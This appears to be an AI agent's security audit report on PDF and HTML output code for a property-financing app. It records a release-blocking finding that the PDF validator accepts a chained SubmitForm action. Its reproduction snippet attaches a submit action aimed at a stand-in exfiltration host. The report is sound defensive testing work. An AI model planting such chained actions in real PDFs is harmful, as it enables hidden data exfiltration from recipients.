# Financing outputs and cleanup prerequisite: Security HOLD

Date: 2026-10-14. Auditor: independent security-guardian. Branch: `codex/property-marketing-release`. Base: `39a971aed6f10e690af3305f3d7a0c61d6babfba`. Scope: the ten released public-output files and three released cleanup prerequisite files pinned below. Governing contract: CTR-004 revision 1, SHA-256 `59d0b203159f5c6c440621437bcd244f664f7a64901924b9a8b952a6a4d70dfa`.

## Executive summary

**HOLD: one High finding in PDF active-content rejection.** An independently altered real Chromium PDF retains its approved canonical URI while adding an inline `Next` action that submits to an unapproved remote destination. The actual parser accepts it. The existing output tests pass but do not cover this action chain. The parent acknowledged the blocker and assigned remediation to the original output author; this reviewer owns only this report and did not edit source.

The cleanup prerequisite is source-qualified: the only production SQL change grants schema `USAGE` to a scheduler that already has finite cleanup execution grants. It grants no creation, table access, private export, membership or additional function execution. The author's real PostgreSQL wire RED/GREEN qualifies the targeted cleanup case, while the full canonical PostgreSQL rerun remains pending. Prior database Security/Quality applies to its earlier frozen packet, not these new outputs. Fresh output Security, then fresh Quality, is required after remediation.

The managed CVE watchlist was refreshed on 2026-04-24 and exceeds its 120-day freshness bound. Refresh its intelligence separately. This review uses current production audit results and records locked versions without claiming that the stale watchlist proves all current advisories absent. The imported Svelte-specific material was adapted to this project's actual Next.js surface; no Svelte endpoint verdict is inferred.

## Scorecard

| Category | Status | Findings |
| --- | --- | --- |
| Financial and payment security | HOLD | One active-output boundary finding; no calculation substitution detected in the reviewed projection checks |
| PII exposure | OK within subset | None detected; future inquiry route is not implemented or qualified here |
| Authentication and authorization | OK within subset | None detected; private storage does not confer anonymous publication authority |
| Injection and active content | HOLD | H-FIN-OUTPUT-01, High |
| Dependency security | OK for current audit | Zero production audit advisories; existing exact dependency promoted without a new resolution |
| Configuration and headers | OK within subset | Escaped inert HTML, hash CSP and no-store headers; hosted enforcement pending |
| Data handling and cleanup | OK for delta | Finite cleanup namespace prerequisite only; full canonical PG rerun pending |

## Critical findings

None detected in the assigned subset. No production exploitation, RCE, financial disclosure or customer-data exfiltration was attempted or established.

## High findings

### H-FIN-OUTPUT-01: canonical URI action can chain an unapproved action

**Status: OPEN, release-blocking.** `apps/web/src/server/financing-release-pdf.ts:113` enumerates only indirect object dictionaries and checks a list of forbidden dictionary keys at line 117. It does not reject `Next` or validate action kinds in nested inline dictionaries. At line 133 the page annotation pass checks the primary action's `S` equals `URI` and collects only that primary URI. Consequently its canonical-link check can pass while another action remains attached to the link.

Independent reproduction loaded the final real `text-only-report.pdf`, located its real page link annotation, and added this inline action to the existing approved URI action:

```typescript
action.set(PDFName.of("Next"), pdf.context.obj({
  S: "SubmitForm",
  F: pdf.context.obj({ FS: "URL", F: "https://foreign.invalid/exfil" }),
  Flags: 0,
}));
const changed = await pdf.save({ useObjectStreams: false });
await expect(inspectFinancingReleasePdf(changed)).rejects.toThrow();
```

**Actual RED:** the negative assertion failed because the parser resolved with four pages, original text, zero images and only the approved canonical URL in `links`. The mutation did not replace text, manufacture extracted metadata, change the primary URI or invoke an external destination. The changed PDF existed in memory during the probe; the original PDF and deterministic probe are retained for reproduction. Viewer execution and successful form submission are not claimed.

Severity is High because the security validator admits active remote behavior into a financial document it claims to qualify as inert. This is an engineering boundary defect, not missing lender approval or a human policy decision. No anonymous uploaded-PDF endpoint currently exists, so this finding does not establish an exploitable hosted upload route.

Required repair: reject action chaining and all unsupported action kinds across reachable inline and indirect dictionaries with bounded traversal, while permitting only the finite intended canonical URI action. Add actual PDF regressions for inline and indirect chains, including array forms and unsupported actions. Preserve permitted canonical-link PDF output and existing text/image/seal checks. Re-evaluate the newly released pins before Quality. The parent explicitly instructed this reviewer to freeze the HOLD and stop mutation probes before author repair.

## Medium findings

None detected in the assigned subset. Chromium deployment/runtime, current anonymous route enforcement and inquiry HTTP controls remain explicitly unfinished consumers, not inferred capabilities of this packet.

## Low findings

None detected in the assigned subset. Stale Weapon intelligence is recorded above as an audit limitation, not a product-source finding.

## Reviewed controls and limits

- `financing-release-html.ts:47` parses strict source/presentation input, recomputes the canonical financial result and validates projection, manifest, authority, per-channel rights, quote validity and immutable canonical binding. HTML text and attribute values use the existing escaping function. Internal evidence references and storage keys are not serialized in the public presentation.
- `financing-release-html.ts:268` creates a hash-authorized stylesheet CSP with scripts, connects, objects, frames and base changes denied, same-origin media/form restrictions, no-referrer and no-store headers. The future HTTP handler must send these actual headers, independently enforce current publication eligibility and qualify inquiry CSRF/nonce/idempotency before collection. A meta CSP alone does not enforce `frame-ancestors`.
- `financing-release-render.ts:86` routes browser requests only to the exact supplied canonical document and admitted media bytes; all other requests abort. JavaScript is disabled. Two process-local browser slots, finite navigation/PDF timeouts, exact font hash, normalized-image decoding and actual DOM/PDF parity are present. Production Chromium availability is not qualified by these local fixtures.
- `financing-release-pdf.ts:93` applies byte, page, object and decoded-stream limits and finite font/CMap/image handling. Actual image pixels and source-derived financial text are checked. These controls do not close H-FIN-OUTPUT-01.
- `financing-release-artifacts.ts:135` confines private keys to the resolved source owner, validates the exact HTTPS R2 account host/path and method, refuses redirects, enforces bounded GET time/MIME/length/hash and checks immutable PUT/HEAD/GET behavior. Signed URLs remain internal. Current server media admission is mandatory; an arbitrary caller's owner or media key is not accepted as publication authority. The temporary HTML download descriptor uses the legacy PDF enum, but the actual response MIME is independently checked as HTML.
- `20261014051000_financing_release.sql:566` adds only `grant usage on schema campaign to scheduler_runtime`. The functions remain finite existing security-definer entry points with explicit search paths and revocations. The actual integration test adds positive namespace resolution and negative schema CREATE, inquiry table access, private export and role-membership checks before invoking unchanged bounded cleanup. No query limit or timeout was relaxed.

## Independent verification

| Verification | Result |
| --- | --- |
| Released thirteen source/test/dependency pins and two handoff hashes | All match their supplied frozen values |
| `pnpm exec vitest run --project unit apps/web/src/server/financing-release-output.unit.test.ts apps/web/src/server/financing-release-output-storage.unit.test.ts tooling/tests/unit/financing-release-database.test.ts` | Exit 0, 45 tests passed in three files, including 16 output/storage and 29 database source assertions |
| Actual altered PDF negative, `pnpm exec vitest run --config tmp/output-security/vitest.config.ts` | Exit 1, one meaningful RED: expected rejection, parser resolved |
| `pnpm audit --prod --json` | Zero Critical, High, Moderate, Low or informational advisories; 153 dependencies counted |
| `pnpm audit:secrets` | Exit 0, six source roots and public environment boundary passed |
| `git diff --check` | Exit 0 |
| Dependency diff inspection | Only web production declaration and corresponding importer for existing `@playwright/test` 1.63.0; no new package/version/resolution |
| Cleanup diff inspection | Only two SQL lines, sixteen integration assertion lines and eight focused SQL assertion lines; repository unchanged |
| Full canonical PostgreSQL rerun | Pending; prior CI 38534932265 remains failed, not relabeled green |

The first ignored probe configuration incorrectly retained all projects and failed with a Vitest project worker configuration error. The next configuration failed import resolution for root `pdf-lib`. Both were diagnostic setup failures with zero executed probes. The corrected configuration reuses the repository aliases and resolves the existing web `pdf-lib`, then executes the actual parser on the real PDF. No repository Vitest config, source, timeout or gate was modified. Mutation probes stopped after the parent's instruction.

The official broad `scan.ts` writes outside the assigned report scope and traverses unrelated agent files, so it was not run unbounded. The bounded manual source sweeps, repository secret audit, dependency audit and independent behavior probe above supply the relevant deterministic evidence without editing another agent's scan outputs. This is a scoped Security review, not a fresh audit of the whole branch.

The author handoff separately records an exact isolated PostgreSQL 17.5 WASM wire RED: `42501 permission denied for schema campaign` at cleanup after all 1,005 encrypted captures and latest-1,000 decrypt/order assertions. Its targeted GREEN after the namespace prerequisite is evidence supplied by that author, not a database test independently rerun in this Security task. No export performance, timeout or actual canonical PG success is inferred from it.

## Dependency and framework snapshot

Next.js is locked at 16.3.8; React and React DOM at 19.3.0; Playwright at 1.63.0; pdf-lib at 1.17.1; Sharp at 0.35.5. These exceed the historical 2025 patch minima recorded in the stale local catalog. No new latest-CVE completeness assertion is made. Zero current production audit advisories does not prove hosted runtime or browser security qualification.

## Files changed by reviewer

Only this report. Ignored scratch probe/config files retain the independent reproduction. No source, dependency, migration, frozen report, ledger or baseline was edited. No Git mutation, provider call, DNS change, deployment, purchase, live upload or customer communication occurred.

## Frozen evidence

Output handoff SHA-256: `6a8db20d46bdc5e8761d37e3e8eacd0fa98937fe46ee0b67a39f7e0a3f7dd275`. Cleanup handoff SHA-256: `278e4f76b6c5f8f6044351ba9540deb48016bc0c711de885128d98629429d1c5`. Final originals manifest SHA-256: `58df4b90c460e8c4e55bb597e3acd325ea0b2a6617eef3a8a9336f2db9375663`. Scratch probe SHA-256: `3820f3d53ff0d433509f633340f019627dc7936f42e6d05fd7ac1d14f2c5fc88`; scratch config SHA-256: `700e44fd6e82b92d9c0304cd19eb9a8ee864afcebe664178f4dbaec206a89910`.

| File | SHA-256 |
| --- | --- |
| apps/web/src/server/financing-release-render.ts | c78709c28bf7e10585d35dba7ad755771aaf6f63df66e261713f258bad39a279 |
| apps/web/src/server/financing-release-html.ts | b4a4621873723e9245cd3bcfcd77bf9fc4f4133edc1e35a7b1a2c910d0a406a3 |
| apps/web/src/server/financing-release-pdf.ts | 4442bf93721a564cf23e3525e6e566ed53d695e4ccdc8fcd40f91d6dfdf68134 |
| apps/web/src/server/financing-release-artifacts.ts | b26213adb171cb6b09c539a2a1bba806eff23230e23ccd4748cf98dbb8544aac |
| apps/web/src/server/financing-release-output-fixture.js | 201809eeb62ef78e0c081ea0c7df6de5c34cc368c428f48bba4edec8a6a53f63 |
| apps/web/src/server/financing-release-output-fixture.d.ts | ae38b940f65162b0350c8dad7adb64f689caa7c622a35d4efc86d7f7411214bd |
| apps/web/src/server/financing-release-output.unit.test.ts | fa706f50210c7bd9ff419fef3fb8515b708cc128c6788333deea9faa601480db |
| apps/web/src/server/financing-release-output-storage.unit.test.ts | bfede711b4c57ac19e1ecc2a4a9721ef4de32ab3943fc91b8c55af1985c412a3 |
| apps/web/package.json | 3d009dd3f93dec0921036e5f1df9405a148a250e37904bf91517f9d0cc6a998b |
| pnpm-lock.yaml | eae2bc37f24180a04f24d414f93a13c25e1931d59e3d1bfafe816309a01db231 |
| supabase/migrations/20261014051000_financing_release.sql | 0b0bd282e4a12ef47ccc512d6ab63527210c93f80c1ef8282ad08ef81bb70104 |
| packages/db/test/financing-release-repository.integration.test.mjs | 0607a6a27aba8243cd760e062eb879ce45e3a5bc140126774062f9e79c53fec6 |
| tooling/tests/unit/financing-release-database.test.ts | 3f8aea02a0729509e6f71cc8a9741923486ffe1bf280dee37c8af5128b7313d8 |

## Remaining completion gates

Repair H-FIN-OUTPUT-01 and release new author-owned pins, then fresh Security and fresh Quality. Run the full canonical PostgreSQL gate for the cleanup prerequisite. Parent-owned source/media/identity admission, current anonymous routes/host enforcement, saved setup/review/publication UI, per-visitor inquiry nonce and normalization, encrypted capture/delivery/purge composition, actual lender/source rights, R2/Chromium hosted qualification and HighLevel QR handoff remain open. These extended comparison outputs are not a completed one-page flyer or scanned QR supplement. Load repository health and PR review closeout before commit or push; none is authorized or performed by this reviewer.
